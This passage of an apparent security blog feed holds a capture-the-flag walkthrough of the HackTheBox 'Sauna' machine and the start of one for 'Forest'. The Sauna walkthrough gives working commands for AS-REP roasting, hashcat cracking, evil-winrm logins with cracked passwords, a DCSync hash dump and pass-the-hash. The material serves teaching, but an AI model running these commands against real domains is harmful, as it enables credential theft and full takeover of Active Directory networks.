<p><a href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Sauna</title>
      <link>https://fahmifj.github.io/hackthebox/sauna/</link>
      <pubDate>Wed, 07 Apr 2021 12:02:54 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/sauna/</guid>
      <description>Learn basic exploitation of Active Directory</description>
      <content:encoded><![CDATA[<p>Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.</p>
<p>Sauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack to obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user&rsquo;s password. With the obtained password, I&rsquo;m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I&rsquo;m able to gain an interactive shell access as NT Authority\System.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Generating potential usernames</li>
<li>AS-Rep roasting</li>
<li>BloodHound</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Port scanning is the first thing I&rsquo;d do.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nmap -sV -sC -oA nmap/sauna <span class="s1">&#39;10.10.10.175&#39;</span>
</span></span><span class="line"><span class="cl">... &lt;snip&gt; ...
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp   open  domain?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSVersionBindReqTCP: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     version
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="nb">bind</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Egotistical Bank :: Home
</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2020-04-22 00:45:32Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>4/21%Time<span class="o">=</span>5E9F315E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
</span></span><span class="line"><span class="cl">SF:ersionBindReqTCP,20,<span class="s2">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x04bind\0\0\x10\0\x03&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m28s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2020-04-22T00:47:55
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">... &lt;snip&gt; ...
</span></span></code></pre></div><p>Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.</p>
<p><code>nmap</code> also identified Sauna&rsquo;s domain name as <code>EGOTISTICAL-BANK.LOCAL</code>.</p>
<blockquote>
<p>Active Directory domain is similar to web domain both in concept and usage, but the realm is different.  Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.</p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<h4 id="web-pages-overview">Web Pages Overview</h4>
<p>These are some overview of the web pages.</p>
<p><div class="img-container"><img src="imgs/image-20210407123719988.png" alt="image-20210407123719988"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210407123908202.png" alt="image-20210407123908202"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210407123842325.png" alt="image-20210407123842325"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210407123656847.png" alt="image-20210407123656847"  /></div>
</p>
<p>The input vectors doesn&rsquo;t seem injectable.</p>
<h4 id="generating-usernames">Generating Usernames</h4>
<p>These are the hints given by the author:</p>
<p>The first one is the word &ldquo;roast&rdquo; on the homepage and the contact page. This might refer to the AS-REP roasting attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">I got a loan and can&#39;t pay it back, I cant even get a ticket to roast my chestnuts!
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">We will always try to never answer your quetsions - we&#39;re too busy roasting in the sauna, counting our money
</span></span></code></pre></div><p>The second one is the word &ldquo;only one&rdquo;, this can be interpreted as only one of the users is vulnerable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Meet the team. So many bank account managers but only one security manager. Sounds about right!
</span></span></code></pre></div><p>From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.</p>
<blockquote>
<p>Based on common/best practices of <a href="imgs/active-directory-user-naming-convention">AD user naming conventions</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert_name</span><span class="p">(</span><span class="n">userfile</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">userfile</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">names</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">first_letter</span> <span class="o">=</span> <span class="n">names</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">first_name</span> <span class="o">=</span> <span class="n">names</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">lastname</span> <span class="o">=</span> <span class="n">names</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first_name</span><span class="si">}</span><span class="s1">.</span><span class="si">{</span><span class="n">lastname</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first_letter</span><span class="si">}{</span><span class="n">lastname</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first_letter</span><span class="si">}</span><span class="s1">.</span><span class="si">{</span><span class="n">lastname</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first_letter</span><span class="si">}</span><span class="s1">a</span><span class="si">{</span><span class="n">lastname</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">first_letter</span><span class="si">}</span><span class="s1">e</span><span class="si">{</span><span class="n">lastname</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">namelist</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Usage: ./convert-name.py listnames&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">convert_name</span><span class="p">(</span><span class="n">namelist</span><span class="p">)</span>
</span></span></code></pre></div><p>Below are the generated usernames from the script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ python convert-name.py listnames
</span></span><span class="line"><span class="cl">Fergus.Smith
</span></span><span class="line"><span class="cl">FSmith
</span></span><span class="line"><span class="cl">F.Smith
</span></span><span class="line"><span class="cl">FaSmith
</span></span><span class="line"><span class="cl">FeSmith
</span></span><span class="line"><span class="cl">Shaun.Coins
</span></span><span class="line"><span class="cl">SCoins
</span></span><span class="line"><span class="cl">S.Coins
</span></span><span class="line"><span class="cl">SaCoins
</span></span><span class="line"><span class="cl">SeCoins
</span></span><span class="line"><span class="cl">Hugo.Bear
</span></span><span class="line"><span class="cl">HBear
</span></span><span class="line"><span class="cl">H.Bear
</span></span><span class="line"><span class="cl">HaBear
</span></span><span class="line"><span class="cl">HeBear
</span></span><span class="line"><span class="cl">Steven.Kerb
</span></span><span class="line"><span class="cl">SKerb
</span></span><span class="line"><span class="cl">S.Kerb
</span></span><span class="line"><span class="cl">SaKerb
</span></span><span class="line"><span class="cl">SeKerb
</span></span><span class="line"><span class="cl">Bowie.Taylor
</span></span><span class="line"><span class="cl">BTaylor
</span></span><span class="line"><span class="cl">B.Taylor
</span></span><span class="line"><span class="cl">BaTaylor
</span></span><span class="line"><span class="cl">BeTaylor
</span></span><span class="line"><span class="cl">Sophie.Driver
</span></span><span class="line"><span class="cl">SDriver
</span></span><span class="line"><span class="cl">S.Driver
</span></span><span class="line"><span class="cl">SaDriver
</span></span><span class="line"><span class="cl">SeDriver
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-fsmith">Shell as Fsmith</h3>
<h4 id="as-rep-roasting">AS-REP Roasting</h4>
<blockquote>
<p>On <a href="https://fahmifj.github.io/writeup/htb-forest/">Forest Write-up</a>, I briefly explained about AS-REP Roasting.</p>
</blockquote>
<p>With the generated usernames, AS-REP roasting attack can be performed using <code>GetNPUsers.py</code> from Impacket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ GetNPUsers.py -dc-ip <span class="s1">&#39;10.10.10.175&#39;</span> -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt
</span></span></code></pre></div><p>It successfully obtained <code>FSmith</code>&rsquo;s TGT.</p>
<p><div class="img-container"><img src="imgs/image-20210407143301639.png" alt="image-20210407143301639"  /></div>
</p>
<h4 id="cracking-tgt">Cracking TGT</h4>
<p><code>hashcat</code> successfully cracked the TGT (performed on my Windows machine).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt;hashcat.exe -m <span class="m">18200</span> <span class="s1">&#39;$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc&#39;</span> C:/tools/rockyou.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... &lt;snip&gt; ...
</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$FSmith</span>@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10<span class="nv">$737</span>ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: Kerberos 5, etype 23, AS-REP
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$krb5asrep$23$FSmith</span>@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc
</span></span><span class="line"><span class="cl">... &lt;snip&gt; ...
</span></span></code></pre></div><p>The password is <code>Thestrokes23</code>.</p>
<h4 id="remote-access">Remote Access</h4>
<p>This user can login remotely with <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ evil-winrm -i <span class="s1">&#39;10.10.10.175&#39;</span> -u fsmith -p <span class="s1">&#39;Thestrokes23&#39;</span> 
</span></span></code></pre></div><p>User flag is done here.</p>
<center>
<p><div class="img-container"><img src="imgs/image-20210407143917902.png" alt="image-20210407143917902"  /></div>
</p>
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-svc_loanmgr">Shell as svc_loanmgr</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>WinPEAS discovered that <code>svc_loanmanager</code> has an autologon credential.</p>
<center>
<p><div class="img-container"><img src="imgs/image-20210407132849744.png" alt="image-20210407132849744"  /></div>
</p>
</center>
<p>But based on <code>rpcclient</code>, it&rsquo;s actually <code>svc_loanmgr</code>.</p>
<center>
<p><div class="img-container"><img src="imgs/image-20210408043941867.png" alt="image-20210408043941867"  /></div>
</p>
</center> 
<p>This account also can login remotely.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ evil-winrm -i <span class="s1">&#39;10.10.10.175&#39;</span> -u svc_loanmgr -p <span class="s1">&#39;Moneymakestheworldgoround!&#39;</span>
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></div><h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.</p>
<p>I copied <code>SharpHound.exe</code> (the ingestor) to Sauna using <code>evilwin-rm</code> and ran it to start collecting data.</p>
<blockquote>
<p><code>evilwin-rm</code> has capability to transfer files directly between my machine and the remote (Sauna). The keywords are <code>download</code> and <code>upload</code>.</p>
</blockquote>
<center>
<p><div class="img-container"><img src="imgs/image-20210407133118769.png" alt="image-20210407133118769"  /></div>
</p>
</center>
<p>It finished within a few seconds.</p>
<p>I copied the collected data to my machine and loaded it to <code>BloodHound</code> with drag and drop.</p>
<center>
<p><div class="img-container"><img src="imgs/image-20210407133124208.png" alt="image-20210407133124208"  /></div>
</p>
</center>
<p>After trying a few of <code>BloodHound</code>&rsquo;s prebuilt queries, <code>BloodHound</code> reveals that <code>svc_loanmgr</code> has <code>GetChangesAll</code> and <code>GetChanges</code> permissions on the domain.</p>
<p><div class="img-container"><img src="imgs/image-20210407133140640.png" alt="image-20210407133140640"  /></div>
</p>
<p>I can access the help section by right clicking the edge. So, <code>GetChanges</code> and <code>GetChangesAll</code> are in conjunction with <code>DS-Replication-Get-Changes-All</code>. This grants <code>svc_loanmgr</code> ability to perform the DCSync attack.</p>
<p><div class="img-container"><img src="imgs/image-20210407133147048.png" alt="image-20210407133147048"  /></div>
</p>
<p>The &ldquo;Abuse Info&rdquo; section contains how to abuse these privileges using <code>mimikatz</code></p>
<p><div class="img-container"><img src="imgs/image-20210407133150811.png" alt="image-20210407133150811"  /></div>
</p>
<h4 id="credential-dumping">Credential Dumping</h4>
<p>Since Windows Defender typically doesn&rsquo;t get along with <code>mimikatz</code>, I use <code>secretsdump.py</code> to perform a DCSync attack just like I did on Forest.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:<span class="s1">&#39;Moneymakestheworldgoround!&#39;</span>@10.10.10.175 -just-dc-ntlm
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210407133219251.png" alt="image-20210407133219251"  /></div>
</p>
<h4 id="pass-the-hash---psexecpy">Pass the hash - psexec.py</h4>
<p>Now I can use <code>psexec.py</code> to perform pass-the-hash using administrator hash to gain shell access as local system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sauna» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210407133250451.png" alt="image-20210407133250451"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Forest</title>
      <link>https://fahmifj.github.io/hackthebox/forest/</link>
      <pubDate>Sat, 03 Apr 2021 13:51:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/forest/</guid>
      <description>Using BloodHound to discover abusable Active Directory groups</description>
      <content:encoded><![CDATA[<p>When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.</p>
<p>On Forest, enumeration of RPC service with anonymous logon/null session reveals Active Directory users account. With these accounts,  <a href="https://attack.mitre.org/techniques/T1558/004/">AS-REP Roasting</a> attack can be performed to obtain a ticket-granting-ticket (TGT) of a service account. The TGT itself contains the password hash of the user that can be cracked offline, and further allows me gain a foothold into the machine. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\SYSTEM.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>AS-REP roasting</li>
<li>AD recon using BloodHound</li>
<li>Creating network drive</li>
<li>Abusing DCSync rights</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>rpcclient</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ nmap -sV -sC -oA nmap/initial-forest 10.10.10.171 -v
</span></span></code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all format (xml, nmap, gnmap)</li>
<li><code>-v</code>, verbose mode.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">53/tcp   open  domain?
</span></span><span class="line"><span class="cl">| fingerprint-strings:
</span></span><span class="line"><span class="cl">|   DNSVersionBindReqTCP:
</span></span><span class="line"><span class="cl">|     version
</span></span><span class="line"><span class="cl">|_    bind
</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 08:18:45Z)
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
</span></span><span class="line"><span class="cl">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E75CC69%P=x86_64-pc-linux-gnu%r(DNSV
</span></span><span class="line"><span class="cl">SF:ersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span></span><span class="line"><span class="cl">SF:x04bind\0\0\x10\0\x03&#34;);
</span></span><span class="line"><span class="cl">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl">|_clock-skew: mean: 2h26m25s, deviation: 4h02m30s, median: 6m24s
</span></span><span class="line"><span class="cl">| smb-os-discovery:
</span></span><span class="line"><span class="cl">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
</span></span><span class="line"><span class="cl">|   Computer name: FOREST
</span></span><span class="line"><span class="cl">|   NetBIOS computer name: FOREST\x00
</span></span><span class="line"><span class="cl">|   Domain name: htb.local
</span></span><span class="line"><span class="cl">|   Forest name: htb.local
</span></span><span class="line"><span class="cl">|   FQDN: FOREST.htb.local
</span></span><span class="line"><span class="cl">|_  System time: 2020-03-21T01:21:11-07:00
</span></span><span class="line"><span class="cl">| smb-security-mode:
</span></span><span class="line"><span class="cl">|   account_used: guest
</span></span><span class="line"><span class="cl">|   authentication_level: user
</span></span><span class="line"><span class="cl">|   challenge_response: supported
</span></span><span class="line"><span class="cl">|_  message_signing: required
</span></span><span class="line"><span class="cl">| smb2-security-mode:
</span></span><span class="line"><span class="cl">|   2.02:
</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
</span></span><span class="line"><span class="cl">| smb2-time:
</span></span><span class="line"><span class="cl">|   date: 2020-03-21T08:21:14
</span></span><span class="line"><span class="cl">|_  start_date: 2020-03-20T05:27:17
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>From the scan results, I&rsquo;m dealing with a domain controller of an Active Directory system.</p>
<p>When it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I&rsquo;ll also follow that sequence because these three ports are most likely to allow anonymous login.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
<p>I can authenticate myself as anonymous/null session using both <code>smbclient</code> and <code>rppclient</code>. With current access I could get list of users and groups but not to file shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
